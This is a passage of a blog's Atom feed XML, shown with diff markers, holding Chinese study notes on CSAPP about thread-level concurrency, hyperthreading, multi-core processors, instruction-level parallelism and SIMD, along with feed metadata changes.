style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.0037em;">α</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.0310000000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><h3 id="并发和并行">并发和并行</h3><p>术语<strong>并发</strong>是一个通用的概念，指一个同时具有多个活动的系统；而属于<strong>并行</strong>指的是用并发来使得一个系统运行得更快。并行可以在计算机系统的多个抽象层次中运用。按照系统层次结构中由高到低的顺序重点强调三个层次。</p><h4 id="线程级并发">线程级并发</h4><p>超线程（hyperthreading），有时称为同时多线程（simultaneous multi-threading），是一项<strong>允许一个CPU执行多个控制流</strong>的技术。</p><p>多核处理器是将多个CPU集成到一个集成电路芯片上，下图2描述的是一个典型的多核处理器的组织结构，其中微处理器芯片有4个CPU核，每个核都有自己的L1和L2高速缓存，其中L1高速缓存又分为<strong>数据高速缓存</strong>和<strong>指令高速缓存</strong>两部分。</p><p><img src="/img/csapp/1/%E5%A4%9A%E6%A0%B8%E5%A4%84%E7%90%86%E5%99%A8%E7%9A%84%E7%BB%84%E7%BB%87%E7%BB%93%E6%9E%84.png" alt="图2 多核处理器的组织结构"></p><p>常规的处理器需要约2000个时钟周期取做不同线程间的切换，而超线程处理器可以在单个周期的基础上决定要执行哪一线程。</p><p>多核处理器的使用可以从两方面提高系统性能：</p><ol><li>减少了执行多个任务时模拟并发的需要</li><li>可以使得应用程序运行更快</li></ol><h4 id="指令级并行">指令级并行</h4><p>在较低的抽象层次上，现代处理器<strong>可以同时执行多条指令的属性</strong>成为指令级并行。</p><p>如果处理器可以达到比一个周期一条指令更快的执行速率，就称之为超标量（superscalar）。</p><h4 id="单指令、多数据并行">单指令、多数据并行</h4><p>在最低层次上，许多现代处理器拥有特殊的硬件，允许一条指令产生多个可并行执行的操作，这种方式称为单指令、多数据，即SIMD执行。</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;程序编译过程&quot;&gt;程序编译过程&lt;/h2&gt;
-&lt;p&gt;假设已有&lt;code&gt;hello.c&lt;/code&gt;，代码如下：&lt;/p&gt;
-&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class</summary>
-      
-    
-    
-    
-    <category term="csapp" scheme="https://ruom0.github.io/categories/csapp/"/>
-    
-    
-    <category term="csapp" scheme="https://ruom0.github.io/tags/csapp/"/>
+    <category term="csapp" scheme="https://www.ruomo.fun/tags/csapp/"/>
     
   </entry>
   
